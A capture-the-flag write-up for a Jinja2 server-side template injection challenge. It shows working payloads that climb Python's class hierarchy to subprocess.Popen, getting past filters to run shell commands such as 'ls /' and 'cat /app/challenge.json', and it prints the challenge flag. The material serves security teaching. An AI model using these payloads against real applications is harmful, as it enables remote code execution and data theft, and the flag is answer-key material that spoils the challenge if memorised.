# Ghostbusters Template Possession

**Category:** Web Exploitation
**Difficulty:** Medium
**Platform:** Biterra (RiffHack CTF 2026)

---

## Challenge Description

> *"Spengler's Oscillation Translator is warping the containment HUD in impossible ways. The console still seems eager to reveal what the filters were meant to hide."*

The application allowed users to submit a chant which was reflected back to the page. The challenge description hinted that only specific template constructs were filtered, suggesting the presence of a **Server-Side Template Injection (SSTI)** vulnerability.

---

## Initial Reconnaissance

Inspecting the page revealed template expressions such as:

```jinja
Manifest level: {{ ecto_status }}
Proton surge: {{ proton_level }}
```

The use of `{{ }}` strongly suggested that the application was using a template engine, most likely **Jinja2**.

---

## Confirming SSTI

To verify whether user input was evaluated by the template engine, we supplied a simple arithmetic expression:

```jinja
{{7*7}}
```

The application returned:

```text
49
```

Since the expression was evaluated instead of being rendered literally, SSTI was confirmed.

---

## Fingerprinting the Template Engine

To identify the template engine, we tested:

```jinja
{{7*'7'}}
```

The output was:

```text
7777777
```

In Jinja2, multiplying a string repeats it. This behavior confirmed that the backend was using **Jinja2 (Python)**.

---

## Testing Existing Filters

Common SSTI payloads were blocked:

```jinja
{{config}}
```

and

```jinja
{{cycler.__init__.__globals__.os.popen()}}
```

However, the following payload was accepted:

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
```

This indicated that access to Python's class hierarchy was still available, providing a path to bypass the filters.

---

## Enumerating Python Classes

Using:

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
```

we obtained a list of loaded Python classes.

Near the end of the list, we observed:

```text
subprocess.CompletedProcess
subprocess.Popen
```

Since `subprocess.Popen` allows command execution, it could potentially be abused to achieve Remote Code Execution.

---

## Achieving Remote Code Execution

`subprocess.Popen` appeared at index `[-1]`, so we used:

```jinja
{{''.__class__.__mro__[1].__subclasses__()[-1]
('ls /',shell=True,stdout=-1).communicate()[0]}}
```

The response contained:

```text
b'app
bin
boot
dev
etc
home
...'
```

This confirmed that arbitrary operating system commands could be executed, resulting in **Remote Code Execution (RCE)**.

---

## Enumerating the Application Directory

Next, we listed the contents of `/app`:

```jinja
{{''.__class__.__mro__[1].__subclasses__()[-1]
('ls /app',shell=True,stdout=-1).communicate()[0]}}
```

Output:

```text
Dockerfile
README.md
app.py
challenge.json
exploit.py
requirements.txt
templates
```

Among these files, `challenge.json` appeared to be the most interesting.

---

## Retrieving the Flag

We read the contents of the file using:

```jinja
{{''.__class__.__mro__[1].__subclasses__()[-1]
('cat /app/challenge.json',shell=True,stdout=-1).communicate()[0]}}
```

The response revealed:

```json
{
"name":"Ghostbusters Template Possession",
"category":"Web Exploitation",
"difficulty":"Medium",
"answer":"bitctf{gh057ly_j1nj4_p0ss35510n}"
}
```

---

## Flag

```text
bitctf{gh057ly_j1nj4_p0ss35510n}
```

---

